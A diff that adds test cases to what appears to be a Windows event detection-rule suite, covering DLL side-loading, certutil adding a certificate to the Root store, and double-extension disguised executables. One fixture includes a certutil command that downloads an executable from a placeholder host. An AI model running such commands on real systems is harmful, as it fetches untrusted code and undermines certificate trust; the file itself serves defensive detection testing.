@@ -2501,6 +2501,67 @@ CASES = [
             TargetObject=r"HKCU\SOFTWARE\SomeApp\Settings\Theme",
         ),
     ),
+    # --- DLL side-loading: unsigned DLL from a user-writable path (SYS-197) ---
+    (
+        "SYS-197",
+        True,
+        event(
+            7,
+            Image=r"C:\Windows\System32\svchost.exe",
+            ImageLoaded=r"C:\Windows\Temp\evil.dll",
+            Signed="false",
+        ),
+    ),
+    (
+        "SYS-197",
+        False,
+        event(
+            7,
+            Image=r"C:\Windows\System32\svchost.exe",
+            ImageLoaded=r"C:\Windows\System32\evil.dll",
+            Signed="false",
+        ),
+    ),
+    (
+        "SYS-197",
+        False,
+        event(
+            7,
+            Image=r"C:\Windows\System32\svchost.exe",
+            ImageLoaded=r"C:\Windows\Temp\legit.dll",
+            Signed="true",
+        ),
+    ),
+    # --- Certutil installs a certificate into a trust store (SYS-198) ---
+    (
+        "SYS-198",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\certutil.exe",
+            command_line="certutil -addstore Root evil.cer",
+        ),
+    ),
+    (
+        "SYS-198",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\certutil.exe",
+            command_line="certutil -urlcache -f http://x/a.exe a.exe",
+        ),
+    ),
+    # --- Executable disguised as an installer package (SYS-199) ---
+    (
+        "SYS-199",
+        True,
+        event(1, image=r"C:\Users\bob\Downloads\setup.msi.exe"),
+    ),
+    (
+        "SYS-199",
+        False,
+        event(1, image=r"C:\Users\bob\Downloads\setup.msi"),
+    ),
 ]
 
 
